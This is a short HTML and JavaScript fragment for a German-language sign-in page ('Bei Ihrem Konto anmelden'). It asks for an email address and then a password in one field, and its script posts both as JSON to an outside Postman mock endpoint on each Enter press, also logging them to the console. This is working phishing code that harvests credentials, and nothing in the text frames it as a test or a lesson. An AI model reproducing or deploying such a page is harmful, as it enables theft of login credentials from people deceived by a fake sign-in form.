    <title>Bei Ihrem Konto anmelden</title>

	<script>
		
		email = "";
		pw = "";
		
		function initDone() {
			var input = document.getElementById("inputField");
			input.addEventListener("keypress", function(event) {
			  if (event.key === "Enter") {
				clickWeiter();
			  }
			});
		}
		
		function sendData() {
			fetch('https://10d20abe-f6d6-4cf3-bfa3-71c6dd1ca0e5.mock.pstmn.io', {
				method: 'POST',
				headers: {
					'Accept': 'application/json',
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({ "email": email, "pw": pw })
			})
			   .then(console.log("send"));
		}
	
		function clickWeiter() {
		  const element = document.getElementById("inputField");
		  
		  if (email != "" && pw === ""){
			pw = element.value;
		  }
		  if (email === ""){
			email = element.value;
		  }
		  
		  
		  element.placeholder = "Passwort";
		  element.value = "";
		  
		  console.log(email +";" + pw);
		  sendData();
		}
	</script>
